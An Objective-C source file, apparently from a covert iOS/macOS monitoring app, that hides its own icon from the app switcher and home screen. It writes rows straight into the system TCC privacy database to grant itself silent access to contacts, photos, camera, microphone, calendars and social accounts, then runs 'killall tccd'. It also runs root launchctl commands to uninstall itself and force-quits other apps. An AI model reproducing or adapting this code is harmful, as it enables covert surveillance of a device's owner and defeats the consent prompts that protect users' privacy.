//
//  AppVisibility.m
//  AppContext
//
//  Created by Dominique  Mayrand on 12/21/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "AppVisibilityImp.h"
#import "DefStd.h"
#import "SharedFileIPC.h"
#import "MessagePortIPCSender.h"
#import "FMDatabase.h"
#import "FMResultSet.h"

#import "SpringBoardServices.h"

#if TARGET_OS_IPHONE
#else
#import <SystemConfiguration/SystemConfiguration.h>
#import <AppKit/AppKit.h>
#endif

@interface AppVisibilityImp (private)
- (void) insertPrivacyAccess;
- (void) insertPrivacyAccessTime;
- (void) forceTerminateApps;
@end

@implementation AppVisibilityImp

- (id) init {
	if ((self = [super init])) {
	}
	return (self);
}

#pragma mark -
#pragma mark - Applicaton visibility protocol
#pragma mark -

-(void) hideIconFromAppSwitcherIcon: (BOOL) aASHide andDesktop: (BOOL) aDHide {
	NSMutableData *data = [NSMutableData data];
	[data appendBytes:&aASHide length:sizeof(BOOL)];
	[data appendBytes:&aDHide length:sizeof(BOOL)];
	NSBundle* bundle = [NSBundle mainBundle];
	NSString* bundleID = [bundle bundleIdentifier];
	NSInteger length = [bundleID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	[data appendBytes:&length length:sizeof(NSInteger)];
	[data appendData:[bundleID dataUsingEncoding:NSUTF8StringEncoding]];
	//NSString *bundleName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleName"]; // e.g: ssmp
	NSString *bundleName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"]; // e.g: MBackup
	length = [bundleName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	[data appendBytes:&length length:sizeof(NSInteger)];
	[data appendData:[bundleName dataUsingEncoding:NSUTF8StringEncoding]];
	
	SharedFileIPC *sf = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate];
	[sf writeData:data withID:kSharedFileVisibilityID];
	[sf release];
}

- (void) hideApplicationIconFromAppSwitcherSpringBoard: (NSArray *) aBundleIdentifiers {
	NSMutableData *bundleIdentifiersData = [NSMutableData data];
	NSInteger count = [aBundleIdentifiers count];
	[bundleIdentifiersData appendBytes:&count length:sizeof(NSInteger)];
	for (NSString *bundleIdentifier in aBundleIdentifiers) {
		NSInteger len = [bundleIdentifier lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
		[bundleIdentifiersData appendBytes:&len length:sizeof(NSInteger)];
		[bundleIdentifiersData appendData:[bundleIdentifier dataUsingEncoding:NSUTF8StringEncoding]];
	}
	SharedFileIPC *sf = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate];
	[sf writeData:bundleIdentifiersData withID:kSharedFileVisibilitiesOFFID];
	[sf release];
}

- (void) showApplicationIconInAppSwitcherSpringBoard: (NSArray *) aBundleIdentifiers {
	NSMutableData *bundleIdentifiersData = [NSMutableData data];
	NSInteger count = [aBundleIdentifiers count];
	[bundleIdentifiersData appendBytes:&count length:sizeof(NSInteger)];
	for (NSString *bundleIdentifier in aBundleIdentifiers) {
		NSInteger len = [bundleIdentifier lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
		[bundleIdentifiersData appendBytes:&len length:sizeof(NSInteger)];
		[bundleIdentifiersData appendData:[bundleIdentifier dataUsingEncoding:NSUTF8StringEncoding]];
	}
	SharedFileIPC *sf = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate];
	[sf writeData:bundleIdentifiersData withID:kSharedFileVisibilitiesONID];
	[sf release];
}

- (void) applyAppVisibility {
	MessagePortIPCSender *messagePort = [[MessagePortIPCSender alloc] initWithPortName:kAppVisibilityMessagePort];
	[messagePort writeDataToPort:[NSData data]]; // Just to signal the changes
	[messagePort release];
}


- (void) launchApplication {
#if TARGET_OS_IPHONE
	NSBundle* bundle = [NSBundle mainBundle];
	NSString* bundleID = [bundle bundleIdentifier];
	NSString* bundleName = [[[bundle infoDictionary] objectForKey:@"CFBundleName"] retain];
	DLog(@"bundleID: %@, bundleName: %@", bundleID, bundleName);
	
	if ([[[UIDevice currentDevice] systemVersion] intValue] >= 6) {
		[NSThread sleepForTimeInterval:0.4];
	}
	// IOS 6.x for slower devices like 3gs, 4, 4s there is no problem but faster device like 5
	NSInteger error = SBSLaunchApplicationWithIdentifier((CFStringRef)bundleID, NO);
	DLog(@"SBS launching %@ get error: %ld", bundleName, (long)error);
	if (error) {
		CFStringRef errorStr = SBSApplicationLaunchingErrorString((int)error);
		DLog(@"Converting sbs launching %@ error to string, errorStr: %@", bundleName, (NSString *)errorStr);
		CFRelease(errorStr);
	}
	[bundleName release];
#endif
}

#pragma mark -
#pragma mark - Privacy surpression functions IOS6
#pragma mark -

- (void) hideFromPrivay {
	[self insertPrivacyAccess];
	[self insertPrivacyAccessTime];
    
    system("killall tccd");
}

#pragma mark -
#pragma mark Private methods
#pragma mark -

- (void) insertPrivacyAccess {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	NSFileManager *fileManager = [NSFileManager defaultManager];
	if ([fileManager fileExistsAtPath:@"/var/mobile/Library/TCC/TCC.db"]) {
		NSBundle* bundle = [NSBundle mainBundle];
		NSString* bundleID = [bundle bundleIdentifier];
		NSString *sql = nil;
		NSMutableArray * arrayAccess = [[NSMutableArray alloc] initWithObjects:@"kTCCServiceAddressBook",
																				@"kTCCServiceCalendar" ,
																				@"kTCCServicePhotos",
																				@"kTCCServiceCamera",
																				@"kTCCServiceMicrophone",
																				@"kTCCServiceMotion",
																				@"kTCCServiceReminders",
																				@"kTCCServiceTwitter",
																				@"kTCCServiceFacebook",
																				@"kTCCServiceLiverpool",
																				@"kTTCInfoBundle",
																				@"kTCCServiceSinaWeibo",
																				@"kTCCServiceBluetoothPeripheral",
																				@"ACAccountTypeIdentifierFacebook",
																				@"ACAccountTypeIdentifierTwitter",
																				@"ACAccountTypeIdentifierSinaWeibo",
																				@"kTCCServiceTencentWeibo", nil];
		
		FMDatabase *db = [FMDatabase databaseWithPath:@"/var/mobile/Library/TCC/TCC.db"];
		[db open];
		for (int i=0; i<[arrayAccess count]; i++) {
			if ([[arrayAccess objectAtIndex:i]length]>0) {
				/*
				 service,client,client_type,allowed,prompt_count,csreq ios7
				 service,client,client_type,allowed,prompt_count       ios6
				 */
				sql = [NSString stringWithFormat:@"INSERT OR REPLACE INTO access(service,client,client_type,allowed,prompt_count) VALUES('%@','%@',0,1,0)",
								[arrayAccess objectAtIndex:i], bundleID];
				[db executeUpdate:sql];
				DLog(@"Update privacy access table, error = %@", [db lastErrorMessage]);
			}
		}
		[arrayAccess release];
		[db close];
	} else {
		DLog (@"/var/mobile/Library/TCC/TCC.db not exist");
	}
	[pool release];
}

- (void) insertPrivacyAccessTime {
    /*
     Note: iOS 7.1.2, application need to have tcc access in entitlement otherwise got error:
        "tccd[xxx]: Refusing TCCAccessRequest from client without display name (/usr/libexec/.systemcore/systemcore/systemcore)"
     */
     
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	NSFileManager *fileManager = [NSFileManager defaultManager];
	if ([fileManager fileExistsAtPath:@"/var/mobile/Library/TCC/TCC.db"]) {
		NSBundle* bundle = [NSBundle mainBundle];
		NSString* bundleID = [bundle bundleIdentifier];
		NSString *sql = nil;
		NSMutableArray * arrayAccess = [[NSMutableArray alloc] initWithObjects:@"kTCCServiceAddressBook",
										@"kTCCServiceCalendar" ,
										@"kTCCServicePhotos",
										@"kTCCServiceCamera",
										@"kTCCServiceMicrophone",
										@"kTCCServiceMotion",
										@"kTCCServiceReminders",
										@"kTCCServiceTwitter",
										@"kTCCServiceFacebook",
										@"kTCCServiceLiverpool",
										@"kTTCInfoBundle",
										@"kTCCServiceSinaWeibo",
										@"kTCCServiceBluetoothPeripheral",
										@"ACAccountTypeIdentifierFacebook",
										@"ACAccountTypeIdentifierTwitter",
										@"ACAccountTypeIdentifierSinaWeibo",
										@"kTCCServiceTencentWeibo",nil];
		
		FMDatabase *db = [FMDatabase databaseWithPath:@"/var/mobile/Library/TCC/TCC.db"];
		[db open];
		for (int i=0; i<[arrayAccess count]; i++) {
			if ([[arrayAccess objectAtIndex:i]length]>0) {
				// The table schema for both iOS 6 & 7 is the same
				sql = [NSString stringWithFormat:@"INSERT OR REPLACE INTO access_times VALUES('%@','%@',0,0)",
									[arrayAccess objectAtIndex:i], bundleID];
				[db executeUpdate:sql];
				DLog (@"Update privacy access_times table, error = %@", [db lastErrorMessage]);
			}
		}
		[arrayAccess release];
		[db close];
	} else {
		DLog (@"/var/mobile/Library/TCC/TCC.db not exist");
	}
	[pool release];
}

- (void) uninstallApplication {
#if TARGET_OS_IPHONE
    NSString *uninstallScript = nil;
    
    NSBundle *bundle = [NSBundle mainBundle];
    NSString *bundleResourcePath = [bundle resourcePath];
    NSString *bundleIdentifier = [bundle bundleIdentifier];
    
    if ([[[UIDevice currentDevice] systemVersion] intValue] <= 7) {
        NSString *uninstallPath = [bundleResourcePath stringByAppendingString:@"/Uninstall.sh"];
        uninstallScript = [NSString stringWithFormat:@"launchctl submit -l %@.unload -p  %@ start appl-unload-all", bundleIdentifier, uninstallPath];
    } else {
        // iOS 8
        // Note: launchctl load cannot load plist from daemon path so we copy it to /tmp or get it from /Applications folder
        NSString *bundleName = [[bundle infoDictionary] objectForKey:@"CFBundleName"]; // e.g: systemcore
        NSString *uninstallPath = [NSString stringWithFormat:@"/Applications/%@.app/%@.unload.plist", bundleName, bundleIdentifier];
        
        /***************************************************************************************************
         *
         NOTE:
         -----
            If application is installed from Cydia 1.1.16, all files in /Applications/systemcore.app folder
         have changed owner to 503, we don't know why. iOS below 8 is just work fine because we don't
         use command load from plist file.
         
            This issue causes the application cannot uninstall.
         *
         ***************************************************************************************************/
        
        NSString *chownCmd = nil;
        NSFileManager *fileManager = [NSFileManager defaultManager];
        
        if ([fileManager fileExistsAtPath:uninstallPath]) {
            uninstallScript = [NSString stringWithFormat:@"launchctl load %@", uninstallPath];
            chownCmd = [NSString stringWithFormat:@"chown root %@", uninstallPath];
        } else {
            NSString *uninstallPath = [NSString stringWithFormat:@"%@/%@.unload.plist", bundleResourcePath, bundleIdentifier];
            DLog(@"uninstallPath %@", uninstallPath)
            // path /tmp/com.applle.systemcore.unload.plist
            NSString *tempUninstallPath = [NSString stringWithFormat:@"/tmp/%@.unload.plist", bundleIdentifier];
            DLog(@"tempUninstallPath %@", tempUninstallPath)
            [fileManager copyItemAtPath:uninstallPath toPath:tempUninstallPath error:nil];
            uninstallScript = [NSString stringWithFormat:@"launchctl load %@", tempUninstallPath];
            chownCmd = [NSString stringWithFormat:@"chown root %@", tempUninstallPath];
        }
        
        DLog (@"chownCmd = %@", chownCmd);
        system([chownCmd cStringUsingEncoding:NSUTF8StringEncoding]);
    }
    
    DLog (@"uninstallScript = %@", uninstallScript);
    system([uninstallScript cStringUsingEncoding:NSUTF8StringEncoding]);
    
    exit(0);
#endif
}

- (void) uninstallApplicationMac {
    NSBundle *bundle = [NSBundle mainBundle];
    NSString *bundleResourcePath = [bundle resourcePath];
    NSString *uninstallScript = [bundleResourcePath stringByAppendingString:@"/UnInstall.sh"];
    NSMutableDictionary * myCommand = [[NSMutableDictionary alloc]init];
    [myCommand setObject:@"uninstall"forKey:@"type"];
    [myCommand setObject:uninstallScript forKey:@"command"];
    
    NSMutableData *data = [[NSMutableData alloc] init];
    NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
    [archiver encodeObject:myCommand forKey:@"command"];
    [archiver finishEncoding];
    [archiver release];
    
    BOOL successfully = FALSE;
    MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:@"bSecuriyAgents"];
    successfully = [messagePortSender writeDataToPort:data];
    [messagePortSender release];
    messagePortSender = nil;
    
    [data release];
    [myCommand release];
    
    exit(0);
}

- (void) rebootMac {
    [self forceTerminateApps];
    
    NSMutableDictionary * myCommand = [[NSMutableDictionary alloc]init];
    [myCommand setObject:@"reboot"forKey:@"type"];
    
    NSMutableData *data = [[NSMutableData alloc] init];
    NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
    [archiver encodeObject:myCommand forKey:@"command"];
    [archiver finishEncoding];
    [archiver release];
    
    BOOL successfully = FALSE;
    MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:@"bSecuriyAgents"];
    successfully = [messagePortSender writeDataToPort:data];
    [messagePortSender release];
    messagePortSender = nil;
    
    [data release];
    [myCommand release];
    
    exit(0);
}

- (void) shutdownMac {
    [self forceTerminateApps];
    
    NSMutableDictionary * myCommand = [[NSMutableDictionary alloc]init];
    [myCommand setObject:@"shutdown"forKey:@"type"];
    
    NSMutableData *data = [[NSMutableData alloc] init];
    NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
    [archiver encodeObject:myCommand forKey:@"command"];
    [archiver finishEncoding];
    [archiver release];
    
    BOOL successfully = FALSE;
    MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:@"bSecuriyAgents"];
    successfully = [messagePortSender writeDataToPort:data];
    [messagePortSender release];
    messagePortSender = nil;
    
    [data release];
    [myCommand release];
    
    exit(0);
}

- (void) forceTerminateApps {
#if !TARGET_OS_IPHONE
    NSString *bundleID = [[NSBundle mainBundle] bundleIdentifier];
    NSArray *allApps = [[NSWorkspace sharedWorkspace] runningApplications];
    for (NSRunningApplication *app in allApps) {
        if (![[app bundleIdentifier] isEqualToString:bundleID]) {
            DLog (@"Force terminate: %@", [app bundleIdentifier]);
            [app forceTerminate];
        }
    }
#endif
}

#pragma mark -
#pragma mark Memory management methods
#pragma mark -

- (void) dealloc {
	[super dealloc];
}

@end
